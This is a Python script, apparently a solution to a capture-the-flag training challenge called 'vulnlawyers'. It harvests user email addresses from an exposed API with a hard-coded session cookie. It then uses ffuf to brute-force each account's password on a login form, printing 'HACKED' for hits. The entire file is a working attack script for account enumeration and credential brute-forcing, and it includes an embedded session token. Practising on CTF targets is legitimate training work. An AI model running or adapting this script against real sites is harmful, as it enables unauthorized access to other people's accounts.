import requests as rq
import subprocess
import json

prefix1 = "[*] "
prefix2 = " + "
def log1(s):
    print(prefix1+s)
def log2(s):
    print(prefix2+s)

headers = {}
headers['Cookie'] = "ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSjZibkZrYnpJMmVpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI4ZTA0YTYwMDM2MDUzNjNjOTg4MDY5Yzk1YTMwMzVkNSJ9"
url_data = 'http://data.vulnlawyers.co.uk/users'

r = rq.get(url_data, headers=headers)
data = json.loads(r.text) #request text (json) to json
emails = []
for user in data["users"]:
    emails.append(user["email"])
log1("Retrievied email from API:\n "+' \n '.join(emails))

# credential brtf using ffuf
cmd = 'ffuf -t 1 -p 0.05 -w /home/intx/ctf/ctfchallenge/vulnlawyers/{file} -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSjZibkZrYnpJMmVpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI4ZTA0YTYwMDM2MDUzNjNjOTg4MDY5Yzk1YTMwMzVkNSJ9" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnlawyers.co.uk/lawyers-only-login -X POST -d "email={email}&password=FUZZ" -mc all -fc 401'
log1("Starting credential bruteforcing with ffuf. Password used: small")
for u in emails:
    log2(f"Hacking:::{u}")
    e = cmd.format(email=u,file="passwords.txt")
    result = subprocess.getoutput(e)
    if "Status" in result:
        log2(f"Result:::HACKED")
        lines = result.split("\n")
        for l in lines:
            if "Status" in l:
                print(l)
    else:
        log2(f"Result:::NO LUCK")
